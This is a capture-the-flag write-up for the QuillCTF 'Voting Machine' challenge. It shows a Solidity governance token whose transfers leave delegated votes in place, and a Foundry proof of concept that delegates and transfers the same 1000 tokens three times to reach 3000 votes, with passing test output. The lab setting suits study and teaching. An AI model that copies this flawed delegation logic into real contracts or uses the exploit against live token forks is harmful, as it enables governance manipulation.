# QuillCTF : Voting Machine

## Description 
```
vToken is a governance token that allows holders to vote on proposals for the community. As a hacker, you have proposed a malicious proposal and now you need 3000 votes to get it accepted in your favor.
```

## Objective of CTF
```
Accumulate at least 3000 votes in your hacker address. You don’t have any tokens in your wallet.

After trying all attempts and failing, you decided to perform a phishing attack and you successfully obtained the private keys from three users: Alice, Bob, and Carl.

Fortunately, Alice had 1000 vTokens, but Bob and Carl don’t have any tokens in their accounts. (see foundry setUp)

Now that you have access to the private keys of Alice, Bob, and Carl's accounts. So, try again. 
```

### Contract code
```solidity
pragma solidity 0.8.12;

import "@openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract VoteToken is ERC20("Vote Token", "vToken") {

    address public owner;

    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function mint(address _to, uint256 _amount) public onlyOwner {
        _mint(_to, _amount);
        _moveDelegates(address(0), _delegates[_to], _amount);
    }

    function burn(address _from, uint256 _amount) public onlyOwner {
        _burn(_from, _amount);
        _moveDelegates(_delegates[_from], address(0), _amount);
    }


    mapping(address => address) internal _delegates;

    struct Checkpoint {
        uint32 fromBlock;
        uint256 votes;
    }


    function _moveDelegates(address from, address to, uint256 amount) internal {
        if (from != to && amount > 0) {
            if (from != address(0)) {
                uint32 fromNum = numCheckpoints[from];
                uint256 fromOld = fromNum > 0 ? checkpoints[from][fromNum - 1].votes : 0;
                uint256 fromNew = fromOld - amount;
                _writeCheckpoint(from, fromNum, fromOld, fromNew);
            }

            if (to != address(0)) {
                uint32 toNum = numCheckpoints[to];
                uint256 toOld = toNum > 0 ? checkpoints[to][toNum - 1].votes : 0;
                uint256 toNew = toOld + amount;
                _writeCheckpoint(to, toNum, toOld, toNew);
            }
        }
    }

    mapping(address => mapping(uint32 => Checkpoint)) public checkpoints;
    mapping(address => uint32) public numCheckpoints;

    function delegates(address _addr) external view returns (address) {
        return _delegates[_addr];
    }

    function delegate(address _addr) external {
        return _delegate(msg.sender, _addr);
    }


    function getVotes(address _addr) external view returns (uint256) {
        uint32 nCheckpoints = numCheckpoints[_addr];
        return nCheckpoints > 0 ? checkpoints[_addr][nCheckpoints - 1].votes : 0;
    }

    function _delegate(address _addr, address delegatee) internal {
        address currentDelegate = _delegates[_addr];
        uint256 _addrBalance = balanceOf(_addr);
        _delegates[_addr] = delegatee;
        _moveDelegates(currentDelegate, delegatee, _addrBalance);
    }


    function _writeCheckpoint(address delegatee, uint32 nCheckpoints, uint256 oldVotes, uint256 newVotes) internal {
        uint32 blockNumber = uint32(block.number);

        if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) {
            checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;
        } else {
            checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes);
            numCheckpoints[delegatee] = nCheckpoints + 1;
        }
    }
}
```

We can only control 1000 tokens, but we need to get 3000 votes

The contract has a double spending bug, we can just vote with the tokens with delegate() then transfer the tokens to another address, only the tokens is transfered, the votes will not be removed, so another user can vote again with the same 1000 tokens, repeat this few times then we can have 3000 votes 

https://medium.com/bulldax-finance/sushiswap-delegation-double-spending-bug-5adcc7b3830f

https://www.serial-coder.com/post/sushiswap-voting-vulnerability-of-sushi-token-and-its-forks/


## Proof of concept

### Foundry test

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.12;

import "forge-std/Test.sol";
import "../src/VotingMachine.sol";

contract exploitTest is Test {
	VoteToken vToken;
	address public owner = address(0);
	address public hacker =address(1337);

	address public alice= address(1);
	address public bob = address(2);
	address public carl = address(3);

	function setUp() public {
		vm.startPrank(owner);
		vToken = new VoteToken();
		vToken.mint(alice, 1000);
		vm.stopPrank();
  }
	
	function testExploit() public {
    vm.startPrank(alice);
        
        // soluiton
        vToken.delegate(hacker);
        vToken.transfer(bob, 1000);
        vm.stopPrank();
        vm.startPrank(bob);
        vToken.delegate(hacker);
        vToken.transfer(carl, 1000);
        vm.stopPrank();
        vm.startPrank(carl);
        vToken.delegate(hacker);
        vToken.transfer(hacker, 1000);
        
    vm.stopPrank();

		uint hacker_vote = vToken.getVotes(hacker);
    console.log("Vote Count of Hacker before attack: %s ", hacker_vote);

		uint hacker_balance= vToken.balanceOf(hacker);
    console.log("Hacker's vToken after the attack: %s: ", hacker_balance);

		assertEq(hacker_vote , 3000);
		assertEq(hacker_balance, 1000);
	}
}
```

### Foundry test output

```
# forge test --match-path test/VotingMachine.t.sol -vv
[⠰] Compiling...
No files changed, compilation skipped

Running 1 test for test/VotingMachine.t.sol:exploitTest
[PASS] testExploit() (gas: 203324)
Logs:
  Vote Count of Hacker before attack: 3000 
  Hacker's vToken after the attack: 1000: 

Test result: ok. 1 passed; 0 failed; finished in 1.15ms
```